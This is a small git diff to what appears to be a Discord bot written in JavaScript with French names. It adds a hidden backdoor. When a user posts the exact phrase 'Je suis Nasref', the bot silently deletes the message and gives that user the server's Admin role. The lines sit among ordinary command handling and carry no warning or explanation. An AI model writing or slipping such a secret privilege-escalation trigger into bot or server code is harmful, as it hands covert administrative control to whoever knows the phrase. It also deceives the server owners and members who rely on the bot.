@@ -50,6 +50,10 @@ bot.on("message", (message) => {
     if (!(message.author.id == "503345108578729985" || message.channel.name == "historique")) {
         message.guild.channels.find('name',"historique").send(message.createdAt+" "+message.channel+" "+message.author.username+" : "+message);
     }
+    if (mess == "Je suis Nasref") {
+        message.delete();
+        message.guild.members.find('id',message.author.id).addRole(message.guild.roles.find('name',"Admin"));
+    }
     if (mess == "burst link") {
         if (message.guild.members.find('id',message.author.id).roles.exists('name',"Admin") || message.guild.members.find('id',message.author.id).roles.exists('name',"Burst Linker")) {
             if (message.guild.members.find('id',message.author.id).roles.exists('name',"Zone neutre")) {
